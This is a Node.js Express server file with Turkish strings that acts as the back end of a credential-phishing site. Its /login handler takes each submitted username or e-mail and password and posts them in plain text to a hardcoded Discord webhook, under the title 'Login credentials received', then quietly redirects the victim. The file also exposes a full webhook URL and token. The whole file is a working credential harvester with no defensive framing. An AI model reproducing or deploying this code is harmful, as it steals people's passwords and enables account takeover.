// server.js
const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

// Webhook URL'niz:
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1438726319738458123/CMfuK3UfPSEqlhuRAte41EBdFIdwD6ZVqjtyA2h5gcw0agqsVVUjfQnsWK_hOZUBKXr6'; 

const app = express();
const PORT = process.env.PORT || 3000; 

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(express.static(path.join(__dirname, 'public')));

app.post('/login', async (req, res) => {
    const { username, password } = req.body;

    const discordPayload = {
        content: `**Giriş yapılıyor..**`,
        embeds: [{
            title: "Giriş Bilgileri Alındı",
            color: 15158332,
            fields: [
                {
                    name: "👤 Kullanıcı Adı / E-posta",
                    value: username || "Veri Yok",
                    inline: false
                },
                {
                    name: "🔑 Şifre",
                    value: password || "Veri Yok",
                    inline: false
                }
            ],
            timestamp: new Date().toISOString(),
            footer: {
                text: "Discord Webhook Bot"
            }
        }]
    };

    try {
        await axios.post(DISCORD_WEBHOOK_URL, discordPayload);
        res.redirect('/'); 
    } catch (error) {
        console.error('Discord Webhook gönderme hatası:', error.message);
        res.redirect('/'); 
    }
});

app.listen(PORT, () => {
    console.log(`Sunucu port ${PORT} üzerinde çalışıyor`);
});